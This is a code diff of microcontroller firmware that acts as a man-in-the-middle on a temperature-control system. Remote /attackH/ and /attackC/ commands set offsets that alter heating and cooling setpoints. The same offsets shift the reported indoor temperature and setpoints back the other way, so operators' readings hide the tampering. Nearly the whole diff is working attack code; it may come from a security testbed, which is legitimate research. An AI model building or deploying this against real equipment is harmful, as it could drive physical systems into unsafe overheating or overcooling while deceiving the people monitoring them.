@@ -14,12 +14,21 @@ WiFiServer server(80);
 
 String clientStr = "";
 bool ipSent = false;
-bool hack = false;
+int overheat = 0;
+int overcool = 0;
+
+//these are the sensor_id's
+int Tin = -1;
+int Tout = -1;
+int spHeat = -1;
+int spCool = -1;
+int lid = -1;
+int heat = -1;
 
 void setup() 
 {
   Serial.begin(115200);
-  delay(100);
+  delay(10);
   server.begin();
 }
 
@@ -42,7 +51,7 @@ void loop()
     clientStr += ch;
     if(ch == '\n')
     {
-      if(hack) clientStr = InterceptSetPoint(clientStr, 0, -4);      
+      if(overheat || overcool) clientStr = InterceptSetPoint(clientStr, overheat, overcool);      
       Serial.print(clientStr);
       clientStr = "";
     }
@@ -60,7 +69,12 @@ void loop()
       {
         if(incoming.indexOf("GET") >= 0) 
         {
-          if(hack) incoming = InterceptReading(incoming, 191, 4);
+          if(overheat || overcool) 
+          {
+            if(spCool != -1) incoming = InterceptReading(incoming, spCool, -overcool);
+            if(spHeat != -1) incoming = InterceptReading(incoming, spHeat, -overheat);
+            if(Tin    != -1) incoming = InterceptReading(incoming,    Tin, -overheat);
+          }
         }
         client.print(incoming);
         incoming = "";
@@ -321,14 +335,52 @@ void CheckServer(void)
 
         if(ch == '\n')
         {
-          if(input.indexOf("/attack/0") != -1) {hack = false; remoteClient.flush();}
-          if(input.indexOf("/attack/1") != -1) {hack = true; remoteClient.flush();}
+          int attack = input.indexOf("/attackH/");
+          if(attack != -1) {overheat = input.substring(attack + 9).toInt(); remoteClient.flush();}
+
+          attack = input.indexOf("/attackC/");
+          if(attack != -1) {overcool = input.substring(attack + 9).toInt(); remoteClient.flush();}
+
+          int sensor = input.indexOf("/tin/");
+          if(sensor != -1) {Tin = input.substring(sensor + 5).toInt(); remoteClient.flush();}
+          
+          sensor = input.indexOf("/tout/");
+          if(sensor != -1) {Tout = input.substring(sensor + 6).toInt(); remoteClient.flush();}
+          
+          sensor = input.indexOf("/spheat/");
+          if(sensor != -1) {spHeat = input.substring(sensor + 8).toInt(); remoteClient.flush();}
+          
+          sensor = input.indexOf("/spcool/");
+          if(sensor != -1) {spCool = input.substring(sensor + 8).toInt(); remoteClient.flush();}
+          
+          sensor = input.indexOf("/lid/");
+          if(sensor != -1) {lid = input.substring(sensor + 5).toInt(); remoteClient.flush();}
+          
+          sensor = input.indexOf("/heat/");
+          if(sensor != -1) {heat = input.substring(sensor + 6).toInt(); remoteClient.flush();}
+          
+          input = "";
         }
       }
     }
 
     String str = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE HTML>\r\n<html>\r\n";
-    str += String(hack);
+    str += String(overheat);
+    str += "\r\n";
+    str += String(overcool);
+    str += "\r\n";
+    str += String(Tin);
+    str += "\r\n";
+    str += String(Tout);
+    str += "\r\n";
+    str += String(spHeat);
+    str += "\r\n";
+    str += String(spCool);
+    str += "\r\n";
+    str += String(lid);
+    str += "\r\n";
+    str += String(heat);
+    str += "\r\n";
     str += "\r\n</html>\r\n";
     
     remoteClient.print(str);
